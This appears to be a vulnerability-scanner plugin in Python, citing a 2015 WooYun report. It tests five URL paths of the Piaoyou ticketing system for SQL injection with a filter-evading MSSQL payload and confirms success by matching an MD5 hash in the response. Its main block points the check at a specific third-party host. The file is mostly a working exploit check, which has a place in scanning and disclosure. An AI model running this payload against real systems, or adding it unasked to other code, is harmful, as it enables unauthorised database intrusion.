#!/usr/bin/evn python 
#--coding:utf-8--*--
#Name:票友票务系统通用sql注入六处(手工绕过注入完美验证)
#Refer:http://www.wooyun.org/bugs/wooyun-2015-0116851
#Author:xq17

def assign(service, arg):
    if service == "piaoyou":
        return True, arg
                
def audit(arg):
    urls = [
    "flight/Print_tp.aspx?sid=1",
    "flight/Print_tp_3.aspx?sid=1",
    # "Other/train_order_detail.aspx?id=",
    "flight/scgq_detail.aspx?id=1",
    "Finance/Inv_req.aspx?id=1",
    "flight/refund_update.aspx?id=1",
    ]

    data = "and/**/1=sys.fn_varbintohexstr(hashbytes(%27MD5%27,%271234%27))--"
    for url in urls:
        vul = arg + url + data
        code, head, res, errcode, _ = curl.curl2(vul)
        if code!=0 and '81dc9bdb52d04dc20036dbd8313ed055' in res:
            security_hole(arg + url)

if __name__ == '__main__':
    from dummy import *
    audit(assign('piaoyou','http://www.15000027520.com:88/')[1])